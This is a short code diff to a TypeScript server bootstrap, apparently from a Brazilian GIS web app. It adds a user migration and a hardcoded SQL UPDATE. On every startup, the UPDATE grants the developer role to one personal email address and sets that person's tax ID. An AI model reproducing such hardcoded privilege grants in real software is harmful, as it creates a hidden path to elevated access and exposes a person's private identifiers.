@@ -31,7 +31,7 @@ import { imagens360Routes, MIGRATION_IMAGENS_360 } from './routes/imagens360/ind
 import { camadasRoutes, MIGRATION_CAMADAS } from './routes/cadastro/camadas'
 import { zonasRoutes } from './routes/cadastro/zonas'
 import { notificacoesRoutes, MIGRATION_NOTIFICACOES } from './routes/notificacoes/index'
-import { usuariosRoutes } from './routes/cadastro/usuarios'
+import { usuariosRoutes, MIGRATION_USUARIOS } from './routes/cadastro/usuarios'
 import { permissoesRoutes, MIGRATION_PERMISSOES } from './routes/admin/permissoes'
 import { sinterRoutes } from './routes/admin/sinter'
 import { devRoutes } from './routes/admin/dev'
@@ -227,6 +227,11 @@ async function bootstrap() {
 
   // Migrações executadas após o servidor subir (pool já aquecido)
   const { query: dbQuery } = await import('./db/pool')
+  dbQuery(MIGRATION_USUARIOS).then(() => {
+    return dbQuery(`UPDATE sigweb.usuarios SET perfil = 'DESENVOLVEDOR', cpf = '026625143-96' WHERE email = 'raf4morais@gmail.com'`)
+  }).catch(err =>
+    app.log.warn({ err }, 'Migration usuarios skipped')
+  )
   dbQuery(MIGRATION_ANOTACOES).catch(err =>
     app.log.warn({ err }, 'Migration anotacoes skipped')
   )
